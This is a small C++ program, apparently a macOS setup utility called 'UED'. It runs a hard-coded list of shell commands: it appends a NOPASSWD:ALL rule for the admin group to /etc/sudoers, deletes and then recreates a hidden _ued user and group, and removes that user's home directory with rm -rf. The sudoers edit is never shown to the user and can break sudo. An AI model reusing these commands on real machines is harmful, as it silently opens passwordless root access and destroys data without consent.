#include <iostream>
#include <vector>

int main(int argc, char const *argv[]){

	std::vector<const char*> commands;
	commands.push_back("echo '%admin		ALL = (ALL) NOPASSWD:ALL' | sudo tee -a  /etc/sudoers");
	commands.push_back("sudo dscl . -delete /Groups/_ued");
	commands.push_back("sudo dscl . -delete /Users/_ued");
	commands.push_back("sudo rm -rf /Users/_ued");
	commands.push_back("sudo dscl . -create /Groups/_ued");
	commands.push_back("sudo dscl . -create /Groups/_ued PrimaryGroupID 4343");
	commands.push_back("sudo dscl . -create /Users/_ued UniqueID 4343");
	commands.push_back("sudo dscl . -create /Users/_ued PrimaryGroupID 4343");
	commands.push_back("sudo dscl . -create /Users/_ued UserShell /bin/bash");
	commands.push_back("sudo dscl . -create /Users/_ued NFSHomeDirectory /Users/_ued");
	commands.push_back("sudo mkdir /Users/_ued");
	commands.push_back("sudo chown _ued:_ued /Users/_ued");
	commands.push_back("open /Users");
	commands.push_back("echo Thank you for using UED!");

	for (int i = 0; i < commands.size(); ++i){
		std::system(commands[i]);
	}
	
	
	return 0;
}